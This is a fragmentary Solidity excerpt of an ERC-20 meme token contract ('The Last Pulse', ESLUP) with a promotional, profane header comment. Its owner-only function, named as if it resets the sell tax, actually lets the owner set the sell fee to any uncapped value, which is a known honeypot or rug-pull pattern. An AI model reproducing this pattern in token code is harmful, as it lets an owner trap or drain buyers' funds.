...
/*
Token Name: The Last Pulse
Symbol: ESLUP
Supply: 1,000,000 initial buy 10,000

Tax: 2/2 buy/sell

revert tax to 0/0 on 10k mcap. LFG mada fucker!

Telegram: https://t.me/esluperc20
...
contract ESLUP is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isExcludedFromMaxWalletSize;
    string private constant _name = "The Last Pulse";
    string private constant _symbol = "ESLUP";
    ...
    constructor () {
        ...
        MarketAddrWallet = payable(0xb0E58cfB4898f96304F1be8cDE28F50dDb173542); 
    ...
    function RervertSellFeesToOriginalTax(uint256 _sellMarketingFee) external onlyOwner{
        sellLiquidityFee = 0;
        sellBurnFee = 0;
        sellMarketingFee = _sellMarketingFee;
       totalSellFees = sellLiquidityFee + sellBurnFee + sellMarketingFee;    }
